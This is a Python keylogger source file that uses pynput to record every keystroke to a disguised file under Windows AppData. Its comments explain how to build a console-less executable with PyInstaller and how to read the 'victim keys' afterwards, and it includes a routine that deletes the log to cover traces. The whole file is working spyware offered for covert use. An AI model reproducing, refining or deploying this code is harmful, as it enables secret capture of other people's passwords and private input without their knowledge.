import os
from pynput.keyboard import Listener
import time 
import threading

class Keylogger():

    keys = []
    count = 0
    flag = 0
    path = os.environ['appdata']+'\\drahthok.txt' # For win os
    # path = '/root/drahthok.txt' for linux
    #path = 'processmanager.txt'


    def on_press(self,key):

        #global keys, count

        self.keys.append(key)

        self.count += 1 

        if self.count >= 1:

            self.count = 0
            self.write_file(self.keys)
            self.keys = []
    def read_logs(self):

        with open(self.path, 'rt') as f:

            return f.read()

# pyinstaller keylogger.py --onefile --noconsole
# cd .datetime A combination of a date and a time. Attributes: ()
# IF YOU SUCCESCLY RUN THIS PROGRAM EASY THEB WRITE THIS CODE IN COMMAND LINE TO SEE VICTIM KEYS
# cd .. 
# cd appdata
# cd Roaming
# dir 
# type drahthok.txt
    def write_file(self, keys):

        with open(self.path, 'a') as file:

            for key in keys:

                k = str(key).replace("'","")

                if k.find('backspace') > 0:

                    file.write(' Backspace ')

                elif k.find('enter') > 0:

                    file.write('\n')
            
                elif k.find('shift') > 0:

                    file.write(' Shift ')

                elif k.find('space') > 0:

                    file.write(' ')
 
                elif k.find('caps_lock') > 0:

                    file.write(' caps_lock ')
 
                elif k.find('Key'):

                    file.write(k)
    
    def self_destruction(self):

        self.flag = 1
        Listener.stop()
        os.remove(self.path)
            
    def start(self):
        global Listener
        with Listener(on_press = self.on_press) as listener:

            listener.join()


if __name__ == '__main__':

    keylog = Keylogger()
    t = threading.Thread(target=keylog.start())
    t.start()
    while keylog.flag != 1:
        time.sleep(10)
        logs = keylog.read_logs()
        print(logs)
        #logs = []
        #keylog.self_destruction()
    t.join()